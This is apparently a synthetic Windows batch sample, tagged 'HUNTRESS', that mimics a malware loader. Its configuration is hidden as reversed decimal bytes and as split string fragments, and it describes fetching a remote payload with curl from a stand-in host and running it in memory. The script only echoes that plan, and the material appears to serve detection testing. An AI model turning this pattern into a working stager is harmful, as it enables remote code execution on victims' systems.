@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:decimal_bytes|reverse
rem HUNTRESS-MATERIAL:116.97.100.46.101.52.100.49.57.51.51.54.47.100.105.108.97.118.110.105.46.101.108.112.109.97.120.101.46.100.53.102.56.51.56.52.49.101.99.47.47.58.115.112.116.116.104.61.108.114.117.124.100.53.102.56.51.56.52.49.101.99.45.110.103.105.97.112.109.97.99.61.100.105.95.110.103.105.97.112.109.97.99.124.101.110.111.110.61.101.103.97.117.103.110.97.108.95.116.120.101.110.124.114.97.101.110.105.108.61.104.112.97.114.103.124.49.61.116.110.117.111.99.95.101.103.97.116.115.124.101.120.101.46.108.114.117.99.61.114.101.116.112.97.100.97.124.121.114.111.109.101.109.95.104.99.116.97.112.115.105.100.44.101.116.111.109.101.114.95.101.114.105.117.113.99.97.61.115.112.101.116.115.124.49.61.118
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set fragment0=v=1^|steps=acquire_remote,dispatch_memory^|adapte
set fragment1=r=curl.exe^|stage_count=1^|graph=linear^|next_lang
set fragment2=uage=none^|campaign_id=campaign-ce14838f5d^|url=h
set fragment3=ttps://ce14838f5d.example.invalid/63391d4e.dat
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_arithmetic=636c93ee"
goto :HUNTRESS_DISPATCH
:HUNTRESS_DISPATCH
set "recovered_configuration=!fragment0!!fragment1!!fragment2!!fragment3!"
echo(!recovered_configuration!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo curl.exe GET https://ce14838f5d.example.invalid/63391d4e.dat then dispatch memory
exit /b 0
